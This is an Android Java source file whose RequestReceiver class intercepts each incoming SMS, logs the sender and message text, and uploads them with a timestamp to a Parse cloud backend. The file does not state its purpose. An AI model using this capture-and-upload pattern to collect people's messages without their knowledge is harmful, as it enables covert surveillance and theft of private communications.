package cerebro.central.services;

import java.util.Date;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import cerebro.central.Logger;
import cerebro.lib.Utils;

import com.parse.ParseObject;

public class RequestReceiver extends BroadcastReceiver {
	@Override
	public void onReceive(Context context, Intent intent) {
		Logger logger = new Logger(context);
		try {
			onReceiveSMS(context, intent, logger);
		} catch (Exception ex) {
			Utils.handle(ex, context);
		} finally {
			logger.close();
		}
	}

	private void onReceiveSMS(Context context, Intent intent, Logger logger) throws Exception {
		try {
			Bundle pudsBundle = intent.getExtras();
			Object[] pdus = (Object[]) pudsBundle.get("pdus");
			SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdus[0]);
			logger.log(String.format("sms: [%s] %s", sms.getOriginatingAddress(), sms.getMessageBody()));

			ParseObject obj = new ParseObject("sms");
			obj.put("from", sms.getOriginatingAddress());
			obj.put("text", sms.getMessageBody());
			obj.put("time", new Date(sms.getTimestampMillis()));
			obj.saveInBackground();

		} catch (Exception ex) {
			logger.log(ex + "\n" + Utils.getStackString(ex));
		}
	}
}
